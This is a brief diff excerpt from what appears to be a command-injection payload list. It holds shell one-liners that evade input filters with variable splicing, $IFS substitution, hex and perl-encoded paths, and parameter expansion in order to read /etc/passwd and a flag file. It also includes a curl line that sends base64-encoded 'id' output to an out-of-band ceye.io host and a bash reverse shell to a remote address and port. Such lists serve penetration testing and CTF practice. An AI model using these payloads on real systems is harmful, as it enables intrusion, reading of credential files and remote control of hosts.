@@ -26,7 +26,7 @@ test=/ehhh/hmtc/pahhh/hmsswd&&cat ${test//hh??hm/}
 curl http://xxxx.ceye.io/$(id|base64)
 bash -i >&/dev/tcp/1.1.1.1/555 0>&1
 a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
-awk -F: '{printf "%-15s->%10s ->%20s\n",$1,$(NF-3),$NF}' /etc/passwd|head -2
+awk -F: '{printf "%-15s->%10s ->%20s\n",$1,$(NF-3),$NF}' /etc/passwd|head -2
 cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
 a=echo$IFS-e$IFS"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";cat$IFS$($a)
 cd $(perl -e "print(chr(0x2f))")
